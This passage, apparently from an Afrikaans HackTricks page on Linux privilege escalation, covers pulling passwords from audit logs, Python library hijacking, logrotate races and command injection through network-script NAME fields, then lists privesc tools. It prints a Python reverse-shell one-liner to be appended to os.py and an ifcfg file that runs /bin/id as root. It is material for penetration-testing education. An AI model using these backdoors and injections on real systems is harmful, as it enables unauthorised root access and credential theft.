Ook kan sommige "**sleg**" gekonfigureerde (backdoored?) **audit logs** jou toelaat om wagwoorde binne audit logs op te teken, soos in hierdie pos verduidelik: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees sal die groep** [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kyk na lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en kyk ook vir IP's en e-posadresse in logs, of hashes regexps.\
Ek gaan nie hier uiteensit hoe om dit alles te doen nie, maar as jy belangstel kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.

## Skryfbare lêers

### Python library hijacking

As jy weet **waar** 'n python-skrip uitgevoer gaan word en jy **kan daarin skryf** in daardie gids of jy kan **python-biblioteke wysig**, kan jy die OS-biblioteek wysig en dit backdoor (as jy kan skryf waar die python-skrip uitgevoer gaan word, kopieer en plak die os.py biblioteek).

Om **backdoor die biblioteek** te doen, voeg net aan die einde van die os.py biblioteek die volgende reël by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-eksploitasie

A kwesbaarheid in `logrotate` laat gebruikers met **skryfregte** op 'n loglêer of sy ouerdirektore moontlik toe om bevoegdhede te eskaleer. Dit is omdat `logrotate`, wat gereeld as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om toestemmings nie net in _/var/log_ na te gaan nie, maar ook in enige gids waar log-rotasie toegepas word.

> [!TIP]
> Hierdie kwesbaarheid beïnvloed `logrotate` weergawe `3.18.0` en ouer

Meer gedetaileerde inligting oor die kwesbaarheid is op hierdie bladsy te vinde: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy bevoegdhede kan eskaleer deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwesbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om welke rede ook al, 'n gebruiker in staat is om 'n `ifcf-<whatever>` skrip na _/etc/sysconfig/network-scripts_ te **skryf** **of** 'n bestaande een te **wysig**, dan is jou **stelsel pwned**.

Network scripts, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Hulle word egter ~sourced~ op Linux deur Network Manager (dispatcher.d).

In my geval word die `NAME=`-attribuut in hierdie netwerk-skripte nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die stelsel die deel ná die wit/leë spasie uitvoer**. Dit beteken dat **alles ná die eerste spasie as root uitgevoer word**.

Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` is die tuiste van **skripte** vir System V init (SysVinit), die **klassieke Linux diensbestuurstelsel**. Dit bevat skripte om `start`, `stop`, `restart`, en soms `reload` dienste uit te voer. Hierdie kan direk uitgevoer word of deur simboliese skakels in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met Upstart, 'n nuwer **service management** bekendgestel deur Ubuntu, wat configuration files gebruik vir diensbestuurstake. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds langs Upstart-konfigurasies gebruik as gevolg van 'n kompatibiliteitslaag in Upstart.

**systemd** tree op as 'n moderne initialisering- en service manager, wat gevorderde funksies bied soos on-demand daemon starting, automount management, en system state snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir distribution packages en `/etc/systemd/system/` vir administrator-wysigings, wat die stelseladministrasieproses vereenvoudig.

## Ander truuks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks koppel gewoonlik 'n syscall om bevoorregte kernel-funksionaliteit aan 'n userspace manager bekend te stel. Swakke manager authentication (bv. signature checks gebaseer op FD-order of swak password-skemas) kan 'n plaaslike app toelaat om die manager te imiteer en op reeds-rooted toestelle na root te eskaleer. Lees meer en uitbuitingsbesonderhede hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste hulpmiddel om na Linux local privilege escalation vectors te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
